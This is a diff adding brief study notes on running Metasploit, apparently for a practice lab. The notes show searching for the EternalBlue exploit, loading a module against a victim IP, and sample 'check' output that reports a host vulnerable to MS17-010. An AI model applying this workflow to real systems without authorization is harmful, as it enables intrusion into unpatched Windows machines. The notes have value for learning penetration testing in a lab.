@@ -1,0 +1,15 @@
+to run:
+    msfconsole
+
+USAGES:
+    - to look up and exploit use:
+        - search exploit eternalblue
+    - you can use msf to empliment basic vulnerabilities:
+        - use <vulnerability> (must set up settings for the ip of the victim host)
+    - we can also check for if the vulnerability will work without emplimenting it
+        - check (command):
+            retruns:
+                        [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+                        [+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+                        [*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
+                        [+] 10.10.10.40:445 - The target is vulnerable.
